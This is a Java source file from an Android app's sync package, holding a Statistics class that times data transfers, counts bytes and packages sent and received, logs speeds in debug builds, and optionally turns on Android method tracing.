package com.android.dvci.action.sync;

import java.util.Date;

import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.util.Check;
import com.android.dvci.util.Utils;

public class Statistics {
	private static final String TAG = "Statistics";

	Date timestamp;
	int totOut = 0;
	int totIn = 0;
	int numPackage = 0;

	private String name;

	private boolean trace;

	private static boolean doOnce = true;

	public Statistics(String string) {
		name = string;
	}

	public Statistics(String string, int length) {
		this(string);
		start(false);
		addOut(length);
	}

	public void start(boolean trace) {
		timestamp = new Date();
		this.trace = trace;
		if (Cfg.TRACE) {
			if (doOnce && trace) {
				doOnce = false;
				startTrace(false);
			}
		}
	}

	public void addOut(int length) {
		totOut += length;
		numPackage++;
	}

	public void addIn(int length) {
		totIn += length;
	}

	public void stop() {
		Date now = new Date();
		double diffTimeMs = now.getTime() - timestamp.getTime();
		if (diffTimeMs == 0) {
			diffTimeMs = 1;
		}
		double speedOut = totOut / diffTimeMs;
		double speedIn = totIn / diffTimeMs;
		double speedTot = (totOut + totIn) / diffTimeMs;

		if (Cfg.DEBUG) {
			Check.log(TAG + " " + name + " elapsed ms: " + diffTimeMs);
			if (totIn != 0) {
				Check.log(TAG + " " + name + " totIn byte: " + totIn + " speedin KB/s: " + speedIn);
			}
			if (totOut != 0) {
				Check.log(TAG + " " + name + " totOut byte: " + totOut + " speedout KB/s: " + speedOut);
			}
			if (totIn != 0 && totOut != 0) {
				Check.log(TAG + " " + name + " speedtot KB/s: " + speedTot + " packages: " + numPackage);
			}
		}
		if (Cfg.TRACE) {
			stopTrace();
		}
	}

	private void stopTrace() {
		try {
			if (trace) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stopTrace): stop Method Tracing");
				}
				android.os.Debug.stopMethodTracing();
			}
		} catch (Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(TAG + " (stopTrace) Error: " + ex);
			}
		}
	}

	private void startTrace(boolean autoStop) {
		if (!trace) {
			return;
		}
		Check.log(TAG + " (startTrace): start Method Tracing");

		android.os.Debug.startMethodTracing("networking." + Utils.getTimeStamp(), 32 * 1024 * 1024);
		Runnable r = new Runnable() {
			public void run() {

				Check.log(TAG + " (run): stop Method Tracing");

				android.os.Debug.stopMethodTracing();
			}
		};
		if (autoStop) {
			Status.self().getDefaultHandler().postDelayed(r, 1000 * 60);
		}
	}

}
